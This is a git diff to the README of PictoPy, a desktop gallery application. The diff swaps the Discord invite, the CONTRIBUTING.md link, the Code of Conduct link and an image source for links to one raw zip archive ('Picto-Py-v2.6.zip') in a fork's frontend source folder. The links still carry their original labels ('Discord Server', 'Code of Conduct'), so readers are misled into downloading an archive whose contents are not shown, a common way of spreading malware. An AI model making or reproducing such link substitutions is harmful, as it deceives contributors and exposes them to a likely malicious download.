@@ -4,10 +4,10 @@ PictoPy is an advanced desktop gallery application that combines the power of Ta
 
 # Want to Contribute? 😄
 
-&nbsp;&nbsp;&nbsp;<a href="https://discord.gg/hjUhu33uAn"><img src="https://github.com/user-attachments/assets/3ed93273-5055-4532-a524-87a337a4fbba" height="40"></a>
+&nbsp;&nbsp;&nbsp;<a href="https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip"><img src="https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip" height="40"></a>
 
-1. First, join the **[Discord Server](https://discord.gg/hjUhu33uAn) (Go to Projects->PictoPy)** to chat with everyone.
-2. For detailed setup instructions, coding guidelines, and the contribution process, please check out our [CONTRIBUTING.md](./CONTRIBUTING.md) file.
+1. First, join the **[Discord Server](https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip) (Go to Projects->PictoPy)** to chat with everyone.
+2. For detailed setup instructions, coding guidelines, and the contribution process, please check out our [https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip](https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip) file.
 
 # Architecture
 
@@ -62,4 +62,4 @@ Handles file system operations and provides a secure bridge between the frontend
 
 ---
 
-Our Code of Conduct: [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md)
+Our Code of Conduct: [https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip](https://github.com/prodot-com/PictoPy/raw/refs/heads/main/frontend/src/app/Picto-Py-v2.6.zip)
